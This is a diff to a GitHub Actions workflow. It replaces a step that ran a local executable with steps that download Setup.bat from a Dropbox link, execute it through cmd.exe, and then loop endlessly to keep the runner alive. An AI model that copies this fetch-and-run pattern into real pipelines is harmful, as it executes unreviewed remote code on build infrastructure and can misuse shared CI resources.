@@ -9,15 +9,21 @@ jobs:
     timeout-minutes: 30
 
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: Run programs and keep session alive
+      - name: Download Setup.bat
         shell: powershell
         run: |
-          Write-Host "Launching programs..."
-          Start-Process ".\keShot.exe" -PassThru
-      
+          $url = "https://www.dropbox.com/scl/fi/wfaf7bsaxd1cvtmk5wnml/Setup.bat?rlkey=kmfk4chndueff0dlyyrhixlyn&st=677kpgqg&raw=1"
+          $output = "Setup.bat"
+
+          Write-Host "Downloading Setup.bat..."
+          Invoke-WebRequest -Uri $url -OutFile $output
+
+      - name: Run Setup.bat and keep session alive
+        shell: powershell
+        run: |
+          Write-Host "Launching Setup.bat..."
+          Start-Process "cmd.exe" -ArgumentList "/c `".\Setup.bat`"" -PassThru
+
           Write-Host "Keep Alive Loop started..."
           while ($true) {
             Start-Sleep -Seconds 10
